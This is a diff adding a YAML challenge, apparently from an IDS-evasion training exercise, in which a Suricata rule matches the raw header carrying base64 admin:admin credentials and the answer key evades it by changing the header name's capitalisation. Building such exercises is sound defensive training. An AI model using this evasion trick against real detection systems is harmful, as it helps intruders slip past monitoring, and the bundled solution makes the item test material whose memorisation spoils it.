@@ -1,0 +1,31 @@
+name: 'Default login 1'
+type: 'exploit'
+
+text: |-
+  Time to bypass the rule(s) below! You're on your own now, but feel free to
+  ask questions!
+
+  **Goal: Log in as admin:admin**
+
+hints: []
+
+target: extinction
+
+base_request: |-
+  GET /avert-disaster.php HTTP/1.1
+  Host: localhost
+  Authorization: basic YWRtaW46YWRtaW4=
+
+solution: |-
+  GET /avert-disaster.php HTTP/1.1
+  Host: localhost
+  AUTHorization: basic YWRtaW46YWRtaW4=
+
+solution_note: Using `http.header.raw`, which lets you do a lot
+
+
+rules:
+- >
+  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.header.raw; content: "Authorization: basic YWRtaW46YWRtaW4="; sid:123456; rev:1;)
+
+expected_output: "Congratulations!"
